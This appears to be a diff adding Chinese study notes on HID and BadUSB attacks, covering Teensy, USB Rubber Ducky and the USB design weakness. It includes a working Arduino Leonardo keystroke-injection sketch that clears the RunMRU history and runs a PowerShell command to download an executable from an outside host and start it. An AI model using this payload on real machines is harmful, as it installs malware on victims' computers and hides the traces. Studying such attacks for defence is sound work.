@@ -1,0 +1,34 @@
+	0.HID（Human Interface Device）设备是直接与人交互的设备。一般来讲针对HID的攻击主要集中在键盘鼠标上，因为只要控制了用户键盘，基本上就等于控制了用户的电脑。攻击者会把攻击隐藏在一个正常的鼠标键盘中，当用户将含有攻击向量的鼠标或键盘，插入电脑时，恶意代码会被加载并执行，基本还是后门程序或者下载网上的木马程序。wifi版名字哦叫做WHID。
+	基于硬件的攻击，攻击程序可能是在驱动，也可能是直接在攻击设备的固件中。
+	1.set 命令集可以将arduino 设置为攻击设备。
+	2.x宝搜索Badusb（号称世界上最邪恶的USB外设） 能够得到USB接口设备，有的可以配合存储卡。 这种东西不仅仅可以作为一个虚拟的CDC串行/COM端口,还可以作为鼠标或者键盘连接到计算机。见过有人使用arduino leonardo来作为一个USB连接设备。BadUSB完全可以利用一般的USB设备制作，而不需要进行硬件定制。
+	在BadUSB出现之前，流行的HID攻击方式有"USB RUBBERDUCKY"和"Teensy"。
+	攻击设备的的时候可以在USB设备中置入一个攻击芯片TEENSY，此攻击芯片是一个非常小而且功能完整的单片机开发系统。通过这个单片机可以模拟出一个键盘和鼠标（我的意思是电脑识别为键盘or鼠标）。
+	USB RUBBER DUCKY（USB橡皮鸭，淘宝叫做USB大黄鸭，将USB设备模拟称为键盘）   
+	3.通过键盘模拟人的输入需要注意绕开输入法的问题。一种方法是在大写模式下输出小写的方式就能够绕开输入法的显示。
+下面是一段使用arduino Leonardo开发板模拟HID攻击键盘的程序，功能是PowerShellDownload： 神奇的是直接执行了cmd命令么
+void setup() {//初始化
+  Keyboard.begin();//开始键盘通讯 
+  delay(5000);//延时
+  Keyboard.press(KEY_LEFT_GUI);//win键 
+  delay(500); 
+  Keyboard.press('r');//r键 
+  delay(500); 
+  Keyboard.release(KEY_LEFT_GUI);
+  Keyboard.release('r');
+  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
+  Keyboard.release(KEY_CAPS_LOCK);
+  delay(500); 
+  Keyboard.println("CMD /C START /MIN REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&CMD /C START /MIN POWERSHELL $P = nEW-oBJECT sYSTEM.nET.wEBcLIENT;$P.dOWNLOADfILE('HTTP://192.168.1.103/X.EXE', 'c:\\X.EXE');START c:\\X.EXE;EXIT");
+  Keyboard.press(KEY_CAPS_LOCK);
+  Keyboard.release(KEY_CAPS_LOCK);
+  Keyboard.end();//结束键盘通讯 
+}
+void loop()//循环
+{
+}
+	4.USB协议的漏洞   导致USB设备却能够被识别为一个键盘
+	现在的USB设备很多，比如音视频设备、摄像头等，因此要求系统提供最大的兼容性，甚至免驱；所以在设计USB标准的时候没有要求每个USB设备像网络设备那样占有一个唯一可识别的MAC地址让系统进行验证，而是允许一个USB设备具有多个输入输出设备的特征。这样就可以通过重写U盘固件，伪装成一个USB键盘，并通过虚拟键盘输入集成到U盘固件中的指令和代码而进行攻击。
+	5.U盘由芯片控制器和闪存两部分组成
+	6.曾经发现的电子香烟通过USB传播恶意软件到PC；央视也报道了充电宝盗取手机隐私的案例。
+	7.苹果手机没有越狱，并不代表安全。越狱只是方便我们提权，一旦日下来就是root。
